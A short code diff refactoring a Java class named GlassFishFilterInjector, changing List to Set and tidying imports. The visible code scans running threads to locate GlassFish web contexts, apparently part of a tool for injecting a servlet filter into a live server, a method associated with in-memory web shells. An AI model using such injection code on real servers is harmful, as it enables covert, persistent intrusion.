@@ -7,10 +7,7 @@ import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
@@ -33,7 +30,7 @@ public class GlassFishFilterInjector {
     }
 
     public GlassFishFilterInjector() {
-        List<Object> contexts = null;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
@@ -75,8 +72,8 @@ public class GlassFishFilterInjector {
      * com.sun.enterprise.web.WebModule
      * /xxx/modules/web-glue.jar
      */
-    public List<Object> getContext() throws Exception {
-        List<Object> contexts = new ArrayList<Object>();
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
         for (Thread thread : threads) {
             if (thread.getName().contains("ContainerBackgroundProcessor")) {
